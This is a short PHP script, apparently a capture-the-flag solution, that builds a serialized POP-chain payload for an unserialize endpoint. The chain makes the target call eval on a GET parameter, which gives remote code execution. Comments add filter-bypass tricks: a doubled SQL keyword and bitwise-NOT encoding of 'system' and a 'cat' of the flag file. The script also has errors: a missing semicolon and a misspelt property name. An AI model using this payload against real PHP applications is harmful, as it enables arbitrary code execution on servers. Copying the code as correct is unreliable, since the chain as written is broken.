<?php
// class Name{
//     public $username;
//     public $password;
//     public function __construct(){
//         $this->username='admin';
//         $this->password=100;
//     }
// }
// $a=new Name;
// echo(serialize($a));


// $a="selselectect";
// $c=preg_replace('/select/i','',$a);
// echo($c);
// $a="system";
// $b="cat /flllllaaaaaaggggggg";
// echo(urlencode(~$a));
// echo("</br>");
// echo(urlencode(~$b));

class syc
{
    public $cuit;
    // public function __destruct()
    // {
    //     echo("action!<br>");
    //     $function=$this->cuit;
    //     return $function();
    // }
}

class lover
{
    public $yxx;
    public $QW;
    // public function __invoke()
    // {
    //     echo("invoke!<br>");
    //     return $this->yxx->QW;
    // }

}

class web
{
    public $eva1;
    public $interesting;

    // public function __get($var)
    // {
    //     echo("get!<br>");
    //     $eva1=$this->eva1;
    //     $eva1($this->interesting);
    // }
}
// if (isset($_POST['url'])) 
// {
//     unserialize($_POST['url']);
// }
$a=new syc;
$a->cuit=new lover;
$a->cuit->yxx=new web;
$a->cuit->yxx->eval="eval"
$a->cuit->yxx->interesting="\$_GET['x']";
echo(serialize($a));